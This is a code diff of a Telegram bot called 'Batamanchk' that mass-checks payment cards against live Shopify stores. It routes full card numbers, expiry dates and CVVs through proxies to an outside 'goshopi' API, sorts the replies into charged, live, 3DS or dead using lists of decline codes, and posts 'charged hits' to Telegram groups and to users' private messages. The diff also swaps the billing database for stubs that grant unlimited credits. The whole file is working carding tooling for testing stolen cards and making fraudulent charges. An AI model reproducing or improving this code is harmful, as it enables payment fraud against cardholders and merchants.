@@ -6,8 +6,8 @@ import logging
 import time
 import threading
 import string
-import psycopg2.extras
 import os
+import aiohttp
 from datetime import datetime
 from typing import Optional, Tuple, List
 from io import BytesIO
@@ -22,11 +22,56 @@ from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
 from aiogram.filters.callback_data import CallbackData
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# LOCAL IMPORTS
+# IN-MEMORY STUBS  (replaces psycopg2 / database / bin / sub)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_db_connection
-from bin import get_bin_info
-from sub import get_premium_status
+
+# ── Per-user in-memory store ──────────────────────────
+_USER_STORE: dict = {}   # { user_id: { credits, premium, plan } }
+
+def _user_record(user_id: int) -> dict:
+    if user_id not in _USER_STORE:
+        _USER_STORE[user_id] = {"credits": 999999, "premium": True, "plan": "ELITE"}
+    return _USER_STORE[user_id]
+
+# database stubs
+def is_gate_enabled(gate: str) -> bool:
+    return True
+
+def get_user_credits(user_id: int) -> int:
+    return _user_record(user_id)["credits"]
+
+def update_credits(user_id: int, new_amount: int) -> None:
+    _user_record(user_id)["credits"] = max(0, new_amount)
+
+def update_user_stats(user_id: int, charged: bool = False, live: bool = False) -> None:
+    pass   # no-op
+
+def get_db_connection():
+    raise RuntimeError("No DB — using in-memory stubs")
+
+# sub stub
+def get_premium_status(user_id: int):
+    rec = _user_record(user_id)
+    return rec["premium"], None
+
+# bin stub — async BIN lookup via binlist.net
+async def get_bin_info(bin6: str) -> dict:
+    try:
+        url = f"https://lookup.binlist.net/{bin6[:6]}"
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with aiohttp.ClientSession(timeout=timeout) as sess:
+            async with sess.get(url, headers={"Accept-Version": "3"}) as r:
+                if r.status == 200:
+                    data = await r.json(content_type=None)
+                    scheme  = data.get("scheme", "N/A").upper()
+                    bank    = (data.get("bank") or {}).get("name", "N/A")
+                    country = (data.get("country") or {}).get("name", "N/A")
+                    alpha2  = (data.get("country") or {}).get("alpha2", "")
+                    flag    = "".join(chr(0x1F1E0 + ord(c) - ord('A')) for c in alpha2.upper()) if alpha2 else ""
+                    return {"scheme": scheme, "bank": bank, "country": country, "country_emoji": flag}
+    except Exception:
+        pass
+    return {}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # BOT IDENTITY — Batamanchk
@@ -36,10 +81,9 @@ CHANNEL_LINK = "https://t.me/Batcardchk"
 BOT_NAME     = "Batamanchk"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# EMOJI IDS  — taken from b3.py + progress-message spec
+# EMOJI IDS  — full set from msh.py + mst.py
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-# b3.py core emojis
 LIVE_EMOJI_ID     = "4958610528588008305"
 DECLINED_EMOJI_ID = "4956612582816351459"
 CARD_EMOJI_ID     = "5800709991627232190"
@@ -48,11 +92,9 @@ TIME_EMOJI_ID     = "5382194935057372936"
 DEV_EMOJI_ID      = "6267091732861555879"
 PRO_EMOJI_ID      = "6298678524379137990"
 
-# b3.py hit-log emojis
 HIT_GATE_EMOJI_ID = "5341715473882955310"
 HIT_RESP_EMOJI_ID = "5839116473951328489"
 
-# Progress-message emojis (from user spec)
 PROG_GATE_EMOJI_ID     = "5341715473882955310"
 PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
 PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
@@ -60,20 +102,14 @@ PROG_LIVE_EMOJI_ID     = "6267225207560214192"
 PROG_DEAD_EMOJI_ID     = "4958526153955476488"
 PROG_ERRORS_EMOJI_ID   = "4956611513369494230"
 
-# Gate / button emojis (msh-specific)
 GATE_EMOJI_ID         = "5801044672658805468"
-
-# Button-specific emoji IDs (raw-dict buttons — carry style + icon)
 BTN_LIVE_EMOJI_ID     = "5039793437776282663"
 BTN_DEAD_EMOJI_ID     = "4956612582816351459"
 BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
 BTN_ALL_EMOJI_ID      = "4956324463525233747"
 BTN_STOP_EMOJI_ID     = "6179444193518162239"
-
-# Hit-log group inline button emoji
 CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"
 
-# Pool of charged emoji IDs (random one shown per charged hit)
 CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
@@ -83,7 +119,6 @@ CHARGED_EMOJI_IDS = [
     "5891044423856296980", "5436068999068662274", "5427168083074628963",
 ]
 
-# Pool of live emoji IDs — random one shown per LIVE hit (from mst.py)
 LIVE_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
     "5287777298894835685", "5285024405246725814", "5287547831677112267",
@@ -94,7 +129,7 @@ LIVE_EMOJI_IDS = [
 ]
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PLAN EMOJIS  — taken from b3.py
+# PLAN EMOJIS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 PLAN_EMOJIS = {
@@ -122,11 +157,9 @@ EXTRA_CHARGED_GROUP_ID = -1003991915326
 BUTTON_LOCK_SECONDS    = 30
 API_URL                = "https://goshopi.up.railway.app/shopii"
 
-# ── Speed control ─────────────────────────────────────
-# Lower = slower, more thorough, safer on proxies.
-# Each card tries up to MAX_RETRIES sites before giving up.
-MAX_CONCURRENT_CARDS = 5      # semaphore: cards processed in parallel
-CARD_DELAY_SECONDS   = 0.5   # pause between launching each card task
+# Speed control — lower = slower but safer on proxies
+MAX_CONCURRENT_CARDS = 5
+CARD_DELAY_SECONDS   = 0.5
 
 MSH_SESSIONS  = {}
 SESSION_LOCKS = {}
@@ -222,7 +255,6 @@ def get_random_charged_emoji() -> str:
     return random.choice(CHARGED_EMOJI_IDS)
 
 def get_random_live_emoji() -> str:
-    """Return a random live emoji from the LIVE_EMOJI_IDS pool (from mst.py)."""
     return random.choice(LIVE_EMOJI_IDS)
 
 def get_plan_emoji_id(plan_name: str) -> str:
@@ -258,28 +290,11 @@ def log_hit_to_mshh(user_id, username, first_name):
     except Exception as e:
         logging.error(f"Error writing to mshh.txt: {e}")
 
-async def get_user_plan_info(user_id):
-    """Returns (plan_name, plan_emoji_id) — mirrors b3.py."""
-    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
-    if is_premium:
-        try:
-            def _sync_fetch():
-                conn   = get_db_connection()
-                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
-                cursor.execute(
-                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
-                    (user_id,)
-                )
-                row = cursor.fetchone()
-                conn.close()
-                return row['plan'] if row else "PREMIUM"
-            plan_name = await asyncio.to_thread(_sync_fetch)
-        except Exception as e:
-            logging.error(f"Error fetching plan name: {e}")
-            plan_name = "PREMIUM"
-        plan_emoji_id = get_plan_emoji_id(plan_name)
-        return plan_name, plan_emoji_id
-    return "TRIAL", PRO_EMOJI_ID
+async def get_user_plan_info(user_id: int) -> Tuple[str, str]:
+    """Returns (plan_name, plan_emoji_id) — uses in-memory store."""
+    rec       = _user_record(user_id)
+    plan_name = rec.get("plan", "ELITE")
+    return plan_name, get_plan_emoji_id(plan_name)
 
 def is_session_stopped(session_id: str) -> bool:
     session = MSH_SESSIONS.get(session_id)
@@ -438,7 +453,6 @@ def load_msh_proxies() -> List[str]:
     """Load proxies — proxies.txt (primary) → px.txt (fallback)."""
     proxies = []
     base = os.path.dirname(os.path.abspath(__file__))
-    # Priority: proxies.txt first, then px.txt
     candidates = [
         os.path.join(base, "proxies.txt"),
         os.path.join(base, "px.txt"),
@@ -466,14 +480,14 @@ def load_msh_proxies() -> List[str]:
     return uniq
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# API CALL — calls real Shopify sites
+# API CALL — calls real Shopify sites via goshopi
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def process_card_api(
     cc: str, mes: str, ano: str, cvv: str,
     site: str, proxy: str, api_url: str
 ) -> Tuple[bool, str, str, str, str, str, str, int]:
-    import aiohttp, json as _json
+    import json as _json
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
     url = f"{api_url}?site={site}&cc={cc_formatted}&proxy={proxy}"
     http_status = None
@@ -512,13 +526,12 @@ async def process_card_api(
 
 def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
     if result_type == "charged":
-        cards_list, type_label = session.get('charged_cards', []),  "Charged"
+        cards_list, type_label = session.get('charged_cards', []), "Charged"
     elif result_type == "live":
-        # "live" button includes charged + live cards
         cards_list = session.get('charged_cards', []) + session.get('live_cards', [])
         type_label = "Live"
     elif result_type == "dead":
-        cards_list, type_label = session.get('dead_cards', []),     "Dead"
+        cards_list, type_label = session.get('dead_cards', []), "Dead"
     else:
         cards_list = (
             session.get('charged_cards', []) + session.get('live_cards', []) +
@@ -588,7 +601,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     return file_buffer, filename, len(cards_list)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HIT LOG TO GROUP
+# HIT LOG TO GROUP — CHARGED only
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def send_hit_log_to_group(
@@ -599,17 +612,21 @@ async def send_hit_log_to_group(
     user_link     = build_user_link(user_obj)
     plan_emoji_id = get_plan_emoji_id(plan_name)
     safe_resp     = safe_html(response_msg)
+    safe_price    = safe_html(price)
+    safe_cur      = safe_html(currency)
 
     if result_type == "CHARGED":
         hit_eid    = get_random_charged_emoji()
         hit_result = "CHARGED"
+        gate_line  = f"<b>Gate ➛ Shopify | {safe_price} {safe_cur}</b>"
     else:
         hit_eid    = get_random_live_emoji()
         hit_result = "LIVE"
+        gate_line  = "<b>Gate ➛ Shopify 0-20$</b>"
 
     caption = (
         f'<b>HIT ➛ {hit_result} <tg-emoji emoji-id="{hit_eid}">💎</tg-emoji></b>\n'
-        f'<b>Gate ➛ Shopify Payments</b>\n'
+        f'{gate_line}\n'
         f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji> <code>{safe_resp}</code></b>\n'
         f'<b>User ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
     )
@@ -635,13 +652,13 @@ async def send_hit_log_to_group(
         logging.error(f"[MSH] Error sending hit log: {e}")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# DM TO USER — Charged + Live hit messages
+# DM TO USER — CHARGED only, NEVER LIVE/TDS/DEAD
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def _build_hit_dm(
+def _build_charged_dm(
     cc_formatted: str, response_msg: str, bin_data: dict,
     price: str, currency: str, elapsed_s: float,
-    user_obj, plan_name: str, result_type: str
+    user_obj, plan_name: str,
 ) -> str:
     bin_scheme    = bin_data.get("scheme", "N/A")
     bin_bank      = bin_data.get("bank", "N/A")
@@ -656,28 +673,15 @@ def _build_hit_dm(
     safe_price    = safe_html(price)
     safe_cur      = safe_html(currency)
     time_str      = f"{int(elapsed_s)}s" if elapsed_s < 60 else f"{int(elapsed_s//60)}m {int(elapsed_s%60)}s"
-
-    if result_type == "CHARGED":
-        charged_emoji_id = get_random_charged_emoji()
-        status_line = (
-            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
-            f'<tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>'
-        )
-        gate_line = f'<b>Gate ➳ Shopify | {safe_price} {safe_cur}</b>'
-    else:  # LIVE / TDS
-        live_emoji_id = get_random_live_emoji()
-        status_line = (
-            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
-            f'<tg-emoji emoji-id="{live_emoji_id}">✅</tg-emoji></b>'
-        )
-        gate_line = '<b>Gate ➳ Shopify 0-20$</b>'
+    charged_eid   = get_random_charged_emoji()
 
     return (
-        f'{status_line}\n'
+        f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
+        f'<tg-emoji emoji-id="{charged_eid}">💎</tg-emoji></b>\n'
         f'\n'
         f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
         f'<b>   ⤷ <code>{cc_formatted}</code></b>\n'
-        f'{gate_line}\n'
+        f'<b>Gate ➳ Shopify | {safe_price} {safe_cur}</b>\n'
         f'<b>──────────</b>\n'
         f'<b>Resp ➳ {safe_resp}</b>\n'
         f'<b>Bin ➳ <code>{bin_info_str}</code></b>\n'
@@ -690,35 +694,33 @@ def _build_hit_dm(
     )
 
 
-async def send_live_dm(
-    bot: Bot, cc_formatted: str, response_msg: str, bin_data: dict,
-    price: str, currency: str, elapsed_s: float, user_obj, plan_name: str
-):
-    """Send DM to user for LIVE (non-charged) hits with random live emoji."""
-    await USER_DM_RATE_LIMITER.wait_if_needed()
-    caption = _build_hit_dm(cc_formatted, response_msg, bin_data, price, currency,
-                            elapsed_s, user_obj, plan_name, "LIVE")
-    try:
-        await bot.send_message(
-            chat_id=user_obj.id, text=caption,
-            parse_mode="HTML", disable_web_page_preview=True
-        )
-    except (TelegramForbiddenError, TelegramBadRequest) as e:
-        logging.warning(f"[MSH] Could not DM live hit to {user_obj.id}: {e}")
-    except Exception as e:
-        logging.error(f"[MSH] Error sending live DM: {e}")
-
-
 async def send_charged_dm(
     bot: Bot, cc_formatted: str, response_msg: str, bin_data: dict,
     price: str, currency: str, elapsed_s: float, user_obj, plan_name: str,
     reply_to_msg_id: Optional[int] = None, is_private: bool = False
 ):
-    """Send DM to user for CHARGED hits. Also posts to extra charged group."""
-    caption_user = _build_hit_dm(cc_formatted, response_msg, bin_data, price, currency,
-                                 elapsed_s, user_obj, plan_name, "CHARGED")
+    """DM the CHARGED hit to user's private chat + post to extra charged group."""
+    caption_user = _build_charged_dm(
+        cc_formatted, response_msg, bin_data,
+        price, currency, elapsed_s, user_obj, plan_name,
+    )
 
-    # Extra charged group caption (slightly shorter — no "User" line)
+    # ── User DM ──────────────────────────────────────────
+    await USER_DM_RATE_LIMITER.wait_if_needed()
+    try:
+        kwargs = dict(
+            chat_id=user_obj.id, text=caption_user,
+            parse_mode="HTML", disable_web_page_preview=True,
+        )
+        if is_private and reply_to_msg_id:
+            kwargs["reply_to_message_id"] = reply_to_msg_id
+        await bot.send_message(**kwargs)
+    except (TelegramForbiddenError, TelegramBadRequest) as e:
+        logging.warning(f"[MSH] Could not DM charged hit to {user_obj.id}: {e}")
+    except Exception as e:
+        logging.error(f"[MSH] Error sending charged DM: {e}")
+
+    # ── Extra charged group ───────────────────────────────
     plan_emoji_id    = get_plan_emoji_id(plan_name)
     user_link        = build_user_link(user_obj)
     charged_emoji_id = get_random_charged_emoji()
@@ -749,26 +751,6 @@ async def send_charged_dm(
         f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
     )
 
-    # DM to user
-    await USER_DM_RATE_LIMITER.wait_if_needed()
-    try:
-        if is_private and reply_to_msg_id:
-            await bot.send_message(
-                chat_id=user_obj.id, text=caption_user,
-                parse_mode="HTML", disable_web_page_preview=True,
-                reply_to_message_id=reply_to_msg_id
-            )
-        else:
-            await bot.send_message(
-                chat_id=user_obj.id, text=caption_user,
-                parse_mode="HTML", disable_web_page_preview=True
-            )
-    except (TelegramForbiddenError, TelegramBadRequest) as e:
-        logging.warning(f"[MSH] Could not DM charged hit to {user_obj.id}: {e}")
-    except Exception as e:
-        logging.error(f"[MSH] Error sending charged DM: {e}")
-
-    # Extra charged group
     await asyncio.sleep(0.5)
     await EXTRA_GROUP_RATE_LIMITER.wait_if_needed()
     try:
@@ -785,14 +767,10 @@ async def send_charged_dm(
 
 def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
     """
-    Returns a raw Telegram inline-keyboard dict so that the extra
-    `style` and `icon_custom_emoji_id` fields are preserved — aiogram's
-    InlineKeyboardButton drops unknown fields, but passing a plain dict
-    lets them pass straight through to the Bot API.
+    Raw inline-keyboard dict — style + icon_custom_emoji_id pass through to Bot API.
 
-    Layout:
-      Row 1: [Charged (N) 💎] [Live (N) ✅] [All (N) 📁]
-      Row 2: [         Stop ⛔         ]   ← only while running
+    Row 1: [Charged (N) 💎]  [Live (N) ✅]  [All (N) 📁]
+    Row 2: [         Stop ⛔         ]   ← only while running
     """
     session   = MSH_SESSIONS.get(session_id, {})
     charged_n = session.get('charged', 0)
@@ -835,7 +813,7 @@ def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
 
 def _build_progress_text(session: dict) -> str:
     """
-    Progress message UI — matches user spec:
+    Progress message UI:
       🛒 Gate ➳ Shopify
       🔄 Progress ➳ N/Total
       Charged ➳ N 💎
@@ -875,10 +853,10 @@ async def update_progress_message(bot: Bot, session_id: str):
     session = MSH_SESSIONS.get(session_id)
     if not session:
         return
-    now          = time.time()
-    last_update  = session.get('last_update_time', 0)
-    is_finished  = session['status'] == "FINISHED"
-    is_stopped   = session['status'] == "STOPPED"
+    now         = time.time()
+    last_update = session.get('last_update_time', 0)
+    is_finished = session['status'] == "FINISHED"
+    is_stopped  = session['status'] == "STOPPED"
 
     if not is_finished and not is_stopped and (now - last_update) < 1.0:
         return
@@ -911,18 +889,19 @@ async def update_progress_message(bot: Bot, session_id: str):
             logging.error(f"[MSH] Progress update error: {e}")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESPONSE CLASSIFICATION — synced from msh.py (latest)
+# RESPONSE CLASSIFICATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 RETRY_ERRORS = [
     'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
     'product not found', 'hcaptcha detected', 'tax ammount empty',
     'del ammount empty', 'product id is empty', 'py id empty',
-    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na', 'DELIVERY_ZONE_NOT_FOUND',
+    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
     'site error! status: 429', 'site requires login!', 'failed to get token',
     'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
     'connection error', 'connection error!', 'error processing card',
-    '504', 'server error', 'client error', 'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
+    '504', 'server error', 'client error', 'failed',
+    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
     'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
     'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
     'connect tunnel failed', 'timeout', 'proxy error',
@@ -941,6 +920,9 @@ RETRY_ERRORS = [
     'returned status 502', 'returned status 503', 'returned status 504',
     'store incompatible', 'extract signedHandles', 'missing receiptId',
     'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
+    'connection timed out', 'connection failed', 'unexpected error',
+    'api error (http', 'api error', 'api timeout',
+    'connection reset', 'network error',
 ]
 
 DECLINED_RESPONSES = [
@@ -951,6 +933,11 @@ DECLINED_RESPONSES = [
     'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
     'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
     'TRANSACTION_NOT_ALLOWED',
+    'declined', 'card_declined', 'do_not_honor', 'insufficient_funds_declined',
+    'lost_card', 'stolen_card', 'expired_card', 'incorrect_cvc',
+    'processing_error', 'fraudulent', 'pickup_card', 'restricted_card',
+    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
+    'try_again_later', 'withdrawal_count_limit_exceeded',
 ]
 
 def classify_response(message: str) -> str:
@@ -958,16 +945,17 @@ def classify_response(message: str) -> str:
     mu = message.upper()
     ml = message.lower()
 
-    if "ORDER_PAID" in mu or "CHARGED" in mu:
+    if "ORDER_PAID" in mu or "CHARGED" in mu or "CAPTURED" in mu:
         return "CHARGED"
 
-    # 3DS — counted under Live, tracked separately
-    if "3DS_REQUIRED" in mu:
+    if "3DS_REQUIRED" in mu or "3D_SECURE" in mu or "3D SECURE" in mu:
         return "TDS"
 
-    # Live hits: INSUFFICIENT_FUNDS / INCORRECT_CVV / INCORRECT_CVC / INCORRECT_ZIP
     if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
             or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
+        return "LIVE"
+
+    if mu.strip() == "APPROVED" or "APPROVED" in mu:
         return "LIVE"
 
     if "GENERIC_ERROR" in mu:
@@ -976,8 +964,10 @@ def classify_response(message: str) -> str:
     if any(d.upper() in mu for d in DECLINED_RESPONSES):
         return "DEAD"
 
-    # Retry / site errors — caller handles retry logic
     if any(r.lower() in ml for r in RETRY_ERRORS):
+        return "RETRY"
+
+    if mu.strip() in ("ERROR", "TIMEOUT"):
         return "RETRY"
 
     return "ERROR"
@@ -1107,11 +1097,11 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
     if result_status == "CHARGED":
         session['charged'] += 1
         session['charged_cards'].append(card_result_data)
-        await asyncio.to_thread(update_user_stats, user_id, True, True)
-        await asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name)
-        current_credits = await asyncio.to_thread(get_user_credits, user_id)
+        # Credit accounting (2 credits per charged hit)
+        current_credits = get_user_credits(user_id)
         if current_credits >= 2:
-            await asyncio.to_thread(update_credits, user_id, current_credits - 2)
+            update_credits(user_id, current_credits - 2)
+        log_hit_to_mshh(user_id, user_obj.username, user_obj.first_name)
         if is_session_stopped(session_id): return
         # Send to hit-log group + DM user
         _tg_run(send_hit_log_to_group(bot, response_msg, "CHARGED", user_obj, plan_name, api_price, api_currency))
@@ -1123,45 +1113,33 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         await asyncio.sleep(1.0)
 
     elif result_status == "TDS":
-        # 3DS counted in Live, tracked separately for the file
+        # 3DS counted in Live — NO DM sent
         session['approved'] += 1
         session['live_cards'].append(card_result_data)
-        session['tds_cards'].append(card_result_data)
-        await asyncio.to_thread(update_user_stats, user_id, False, True)
-        current_credits = await asyncio.to_thread(get_user_credits, user_id)
+        session.setdefault('tds_cards', []).append(card_result_data)
+        current_credits = get_user_credits(user_id)
         if current_credits >= 1:
-            await asyncio.to_thread(update_credits, user_id, current_credits - 1)
-        # DM user for 3DS live hits too
-        _tg_run(send_live_dm(bot, cc_formatted, response_msg, bin_data, api_price, api_currency,
-                             elapsed_s, user_obj, plan_name))
-        await asyncio.sleep(0.5)
+            update_credits(user_id, current_credits - 1)
+        await asyncio.sleep(0.3)
 
     elif result_status == "LIVE":
+        # Live hit — NO DM sent
         session['approved'] += 1
         session['live_cards'].append(card_result_data)
-        await asyncio.to_thread(update_user_stats, user_id, False, True)
-        current_credits = await asyncio.to_thread(get_user_credits, user_id)
+        current_credits = get_user_credits(user_id)
         if current_credits >= 1:
-            await asyncio.to_thread(update_credits, user_id, current_credits - 1)
-        if is_session_stopped(session_id): return
-        # Send to hit-log group + DM user
-        _tg_run(send_hit_log_to_group(bot, response_msg, "LIVE", user_obj, plan_name, api_price, api_currency))
-        if is_session_stopped(session_id): return
-        _tg_run(send_live_dm(bot, cc_formatted, response_msg, bin_data, api_price, api_currency,
-                             elapsed_s, user_obj, plan_name))
+            update_credits(user_id, current_credits - 1)
 
     elif result_status == "DEAD":
         session['dead'] += 1
         session['dead_cards'].append(card_result_data)
-        await asyncio.to_thread(update_user_stats, user_id, False)
-        current_credits = await asyncio.to_thread(get_user_credits, user_id)
+        current_credits = get_user_credits(user_id)
         if current_credits >= 1:
-            await asyncio.to_thread(update_credits, user_id, current_credits - 1)
+            update_credits(user_id, current_credits - 1)
 
     else:  # ERROR / RETRY — no credit deducted
         session['errors'] += 1
         session['error_cards'].append(card_result_data)
-        await asyncio.to_thread(update_user_stats, user_id, False)
 
     if is_session_stopped(session_id):
         return
@@ -1273,7 +1251,7 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Msh
 
 @router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
 async def msh_command(message: types.Message):
-    if not await asyncio.to_thread(is_gate_enabled, "msh"):
+    if not is_gate_enabled("msh"):
         await message.reply("🚧 <b>Mass Gate under maintenance.</b>", parse_mode="HTML")
         return
 
@@ -1285,7 +1263,7 @@ async def msh_command(message: types.Message):
     is_premium, _ = get_premium_status(user_id)
     if not is_premium:
         await message.reply(
-            "💎 <b>Please upgrade to use this feature.</b>\n\n👉 Use /buy to upgrade.",
+            "💎 <b>Premium required.</b>\n\n👉 Use /buy to upgrade.",
             parse_mode="HTML"
         )
         return
@@ -1357,13 +1335,12 @@ async def msh_command(message: types.Message):
         info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n" if (expired_count or invalid_luhn_count) else ""
         await message.reply(f"{info}❌ No valid cards to check.", parse_mode="HTML"); return
 
-    current_credits = await asyncio.to_thread(get_user_credits, user_id)
+    current_credits = get_user_credits(user_id)
     if current_credits < total_cards:
         await message.reply(
             f"❌ <b>Insufficient Credits</b>\n\n"
-            f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
-            f"Your balance: <b>{current_credits}</b> credits.\n\n"
-            f"Please add more credits or reduce the number of cards.",
+            f"You need <b>{total_cards}</b> credits but have <b>{current_credits}</b>.\n\n"
+            f"Use /buy to top up or reduce the number of cards.",
             parse_mode="HTML",
         ); return
 
@@ -1458,7 +1435,6 @@ async def _session_async_worker(bot, session_id, cards, user_obj, plan_name, mai
     if not session:
         return
 
-    # ── Speed control: lower semaphore + delay between card tasks ──
     sem = asyncio.Semaphore(MAX_CONCURRENT_CARDS)
 
     async def worker(cc_formatted, cc_num):
@@ -1482,7 +1458,6 @@ async def _session_async_worker(bot, session_id, cards, user_obj, plan_name, mai
         task = asyncio.create_task(worker(cc_formatted, cc_num))
         tasks.append(task)
         session['tasks'].append(task)
-        # Pause between launching tasks to avoid overwhelming proxy/API
         await asyncio.sleep(CARD_DELAY_SECONDS)
 
     logging.info(f"📋 [MSH] {len(tasks)} tasks created for session {session_id}")
@@ -1496,9 +1471,8 @@ async def _session_async_worker(bot, session_id, cards, user_obj, plan_name, mai
 
     session = MSH_SESSIONS.get(session_id)
     if session and session['status'] != "STOPPED":
-        session['status'] = "FINISHED"
+        session['status']    = "FINISHED"
         session['last_text'] = ""
-        # Final progress update — keeps the same UI format (no summary replacement)
         _tg_run(update_progress_message(bot, session_id))
         logging.info(
             f"🏁 [MSH] Session {session_id} FINISHED — "
